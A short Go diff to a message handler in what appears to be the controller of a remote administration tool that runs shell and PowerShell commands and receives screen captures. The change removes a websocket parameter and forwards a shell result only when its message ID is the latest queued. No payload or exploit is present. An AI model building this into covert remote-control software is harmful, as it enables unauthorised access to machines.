@@ -9,10 +9,10 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
-	"github.com/togettoyou/wsc"
 )
 
-func SettleMsg(message string, ws *wsc.Wsc) {
+func SettleMsg(message string) {
+	messageId := common.GetMsgId(message)
 	if common.ClientId == "" {
 		common.ClientId = common.GetClientId(message)
 		return
@@ -56,7 +56,9 @@ func SettleMsg(message string, ws *wsc.Wsc) {
 			common.ScreenSliceMsgChan <- decData
 			return
 		case "execShell_ret":
-			common.ExecShellMsgChan <- message
+			if messageId == common.MessageQueue[len(common.MessageQueue)-1] {
+				common.ExecShellMsgChan <- message
+			}
 			return
 		case "execPowershell_ret":
 			common.ExecShellMsgChan <- message
